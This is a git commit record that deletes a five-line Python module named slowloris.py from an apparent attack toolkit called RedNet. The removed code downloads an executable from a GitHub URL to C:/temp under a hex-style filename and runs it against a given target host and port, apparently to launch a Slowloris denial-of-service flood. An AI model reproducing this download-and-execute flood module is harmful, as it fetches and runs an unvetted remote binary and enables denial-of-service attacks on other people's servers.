83cc3cc39a46127e750422d29816a55fbcb19b20
ReddyyZ <41487053+ReddyyZ@users.noreply.github.com>
2020-01-15 12:11:49 -0300

    Delete slowloris.py

--- modules/slowloris.py
+++
@@ -1,5 +0,0 @@
-import wget,os
-
-def _flood(alvo,porta):
-    wget.download('https://github.com/ReddyyZ/RedNet/blob/master/modules/slowloris.exe?raw=true', out='C:/temp/0x32546777.exe')
-    os.system('C:/temp/0x32546777.exe {} {}'.format(alvo,porta))
